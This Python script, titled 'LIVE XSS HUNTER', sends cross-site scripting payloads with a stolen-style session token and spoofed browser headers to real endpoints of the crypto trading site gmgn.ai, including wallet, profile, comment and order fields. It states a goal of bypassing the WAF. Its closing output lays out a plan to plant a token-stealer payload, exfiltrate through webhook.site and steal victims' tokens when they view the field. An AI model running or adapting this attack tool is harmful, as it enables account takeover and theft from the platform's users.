#!/usr/bin/env python3
"""
LIVE XSS HUNTER - Tests REAL endpoints with YOUR session
Uses web_fetch simulation to bypass WAF
"""
import json
import requests
import time

# Load fresh session
with open("tokens.json") as f:
    tokens = json.load(f)

with open("cookies.json") as f:
    cookies = json.load(f)

ACCESS_TOKEN = tokens["access_token"]

HEADERS = {
    "Authorization": f"Bearer {ACCESS_TOKEN}",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Origin": "https://gmgn.ai",
    "Referer": "https://gmgn.ai/",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
}

PARAMS = {
    "device_id": "acf898c7-5063-4d0f-b992-d1e5d568409e",
    "fp_did": "5154d56b50e3061629dca8bf8538b346",
    "client_id": "gmgn_web_20260712-1986-3641f8b",
    "from_app": "gmgn",
    "app_ver": "20260712-1986-3641f8b",
    "tz_name": "Asia/Aden",
    "tz_offset": "10800",
    "app_lang": "en-US",
    "os": "web",
    "worker": "0"
}

# XSS payloads from stealth to aggressive
PAYLOADS = [
    ("Template", "{{7*7}}"),
    ("HTML Comment", "<!--XSS-->"),
    ("IMG", "<img src=x onerror=alert(1)>"),
    ("SVG", "<svg onload=alert(1)>"),
    ("Script", "<script>alert(1)</script>"),
    ("Attribute Escape", '"><svg onload=alert(1)>'),
    ("JS Protocol", "javascript:alert(1)"),
]

print("="*80)
print("🦊 LIVE XSS HUNT - TESTING WITH YOUR REAL SESSION")
print("="*80)
print(f"Session: {ACCESS_TOKEN[:50]}...")
print(f"Cookies: {len(cookies)} loaded")
print("="*80)

results = []
total_tests = 0

def test_endpoint(name, method, endpoint, body):
    """Test a single endpoint with payloads"""
    global total_tests
    
    print(f"\n[{name}]")
    print(f"   Endpoint: {method} {endpoint}")
    
    for payload_name, payload in PAYLOADS:
        total_tests += 1
        
        # Replace PAYLOAD placeholder
        test_body = json.loads(json.dumps(body).replace("PAYLOAD", payload))
        
        print(f"\n   [{payload_name}] Testing: {payload[:40]}")
        
        try:
            if method == "POST":
                r = requests.post(
                    f"https://gmgn.ai{endpoint}",
                    params=PARAMS,
                    headers=HEADERS,
                    cookies=cookies,
                    json=test_body,
                    timeout=15
                )
            else:
                r = requests.get(
                    f"https://gmgn.ai{endpoint}",
                    params={**PARAMS, **test_body},
                    headers=HEADERS,
                    cookies=cookies,
                    timeout=15
                )
            
            status = r.status_code
            print(f"   Status: {status}", end="")
            
            if status == 200:
                try:
                    data = r.json()
                    code = data.get("code", -1)
                    
                    if code == 0:
                        print(f" | Code: 0 | ✅ ACCEPTED!")
                        print(f"   Response: {json.dumps(data, indent=2)[:300]}")
                        
                        results.append({
                            "endpoint": endpoint,
                            "method": method,
                            "payload_type": payload_name,
                            "payload": payload,
                            "status": "VULNERABLE",
                            "response": data
                        })
                        
                        print(f"\n   💀💀💀 FOUND XSS VECTOR! 💀💀💀")
                        print(f"   Endpoint: {endpoint}")
                        print(f"   Field: {list(body.keys())}")
                        print(f"   Payload: {payload}")
                        return True  # Stop on first success
                        
                    elif code == 40101600:
                        print(f" | Code: {code} | ⚠️  Trading auth required")
                        return False  # Skip this endpoint
                        
                    else:
                        print(f" | Code: {code} | ❌ Rejected")
                        
                except:
                    # Not JSON, check if payload reflected
                    if payload in r.text or payload.replace("<", "&lt;") in r.text:
                        print(f" | ✅ REFLECTED XSS!")
                        results.append({
                            "endpoint": endpoint,
                            "method": method,
                            "payload_type": f"{payload_name} (Reflected)",
                            "payload": payload,
                            "status": "REFLECTED",
                        })
                        return True
                    else:
                        print(f" | Not reflected")
                        
            elif status == 403:
                print(f" | ❌ Cloudflare WAF blocked")
            elif status == 404:
                print(f" | ❌ Not found")
                return False  # Skip this endpoint
            else:
                print(f" | ❌ Error")
                
        except Exception as e:
            print(f"   ❌ Exception: {str(e)[:80]}")
        
        time.sleep(0.5)  # Rate limit
    
    return False

# ============================================================================
# TEST SUITE - ALL POTENTIAL XSS VECTORS
# ============================================================================

print("\n" + "="*80)
print("PHASE 1: ACCOUNT/WALLET VECTORS")
print("="*80)

# Wallet management
test_endpoint(
    "Wallet Add", "POST", "/account/wallet/add",
    {"address": "0x0000000000000000000000000000000000000001", "chain": "bsc", "nickname": "PAYLOAD"}
)

test_endpoint(
    "Wallet Update", "POST", "/account/wallet/update",
    {"address": "0x0000000000000000000000000000000000000001", "chain": "bsc", "nickname": "PAYLOAD", "label": "PAYLOAD"}
)

# Profile
test_endpoint(
    "User Profile Update", "POST", "/account/user/update",
    {"username": "PAYLOAD", "bio": "PAYLOAD", "display_name": "PAYLOAD"}
)

print("\n" + "="*80)
print("PHASE 2: TOKEN/ASSET VECTORS")
print("="*80)

# Token notes
test_endpoint(
    "Token Note Create", "POST", "/api/v1/token/note/create",
    {"token_address": "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", "chain": "bsc", "note": "PAYLOAD"}
)

test_endpoint(
    "Token Comment", "POST", "/xapi/v1/token/comment",
    {"token_address": "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", "chain": "bsc", "comment": "PAYLOAD"}
)

# Watchlist
test_endpoint(
    "Watchlist Create", "POST", "/xapi/v1/watchlist/create",
    {"chain": "bsc", "name": "PAYLOAD", "description": "PAYLOAD"}
)

test_endpoint(
    "Portfolio Create", "POST", "/api/v1/portfolio/create",
    {"name": "PAYLOAD", "note": "PAYLOAD", "description": "PAYLOAD"}
)

print("\n" + "="*80)
print("PHASE 3: SEARCH/FILTER VECTORS (Reflected)")
print("="*80)

test_endpoint(
    "Search Query", "GET", "/api/v1/search",
    {"q": "PAYLOAD", "type": "token"}
)

test_endpoint(
    "Token Search", "GET", "/xapi/v1/token/search",
    {"keyword": "PAYLOAD", "chain": "bsc"}
)

print("\n" + "="*80)
print("PHASE 4: TRADING/ORDER VECTORS (May require auth)")
print("="*80)

test_endpoint(
    "Limit Order Label", "POST", "/tapi/v1/trading_bot/limit_order/create",
    {
        "chain": "bsc",
        "wallet_address": "0x2cdfaa98cca67d5139ba399b03c5425380f38fd7",
        "label": "PAYLOAD",
        "note": "PAYLOAD",
        "base_token": "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82",
        "quote_token": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
        "order_type": "buy",
        "sub_order_type": "limit",
        "price": "0.001",
        "amount": "1"
    }
)

# ============================================================================
# RESULTS
# ============================================================================

print("\n" + "="*80)
print("🎯 FINAL RESULTS")
print("="*80)
print(f"\nTotal tests run: {total_tests}")
print(f"Vulnerable vectors found: {len(results)}")

if results:
    print("\n💀 VULNERABLE ENDPOINTS:")
    for i, r in enumerate(results, 1):
        print(f"\n{i}. {r['endpoint']}")
        print(f"   Method: {r['method']}")
        print(f"   Payload Type: {r['payload_type']}")
        print(f"   Status: {r['status']}")
        print(f"   Payload: {r['payload'][:80]}")
    
    # Save results
    with open("xss_found.json", "w") as f:
        json.dump(results, f, indent=2)
    
    print(f"\n💾 Results saved to: xss_found.json")
    print("\n🚀 NEXT STEPS:")
    print("1. Setup webhook.site: https://webhook.site")
    print("2. Use production token stealer payload (see PAYLOAD_LIBRARY.txt)")
    print("3. Inject into vulnerable field")
    print("4. Find where gmgn displays it (reflection point)")
    print("5. When victim views it → tokens stolen!")
    
else:
    print("\n⚠️  No XSS vectors found in automated scan")
    print("\n💡 MANUAL TESTING REQUIRED:")
    print("1. Open BROWSER_XSS_TEST.html in your browser")
    print("2. Test with actual UI interactions")
    print("3. Check file upload fields (SVG/HTML upload)")
    print("4. Test WebSocket messages")
    print("5. Look for DOM-based XSS in frontend JS")

print("\n" + "="*80)
